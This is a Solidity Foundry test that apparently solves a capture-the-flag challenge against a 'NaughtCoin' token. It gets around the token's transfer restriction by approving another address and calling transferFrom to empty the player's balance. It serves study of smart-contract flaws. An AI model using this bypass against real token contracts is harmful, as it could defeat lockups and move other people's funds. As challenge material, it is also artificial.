//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console2} from "forge-std/Test.sol";
import {NaughtCoin} from "../NaughtCoin.sol";

contract NaugtyCoinTest is Test {
    NaughtCoin naughtyCoin;
    address player = makeAddr("player");
    address receiver = makeAddr("receiver");
    address notPlayer = makeAddr("notPlayer");

    function setUp() public {
        vm.prank(player);
        naughtyCoin = new NaughtCoin(player);
    }
    function test_Challenge15_Passed() public {
        uint256 playerBalance = naughtyCoin.balanceOf(player);
        vm.prank(player);
        naughtyCoin.approve(notPlayer, playerBalance);
        vm.prank(notPlayer);
        naughtyCoin.transferFrom(player, receiver, playerBalance);
        assertEq(naughtyCoin.balanceOf(player), 0);
    }
}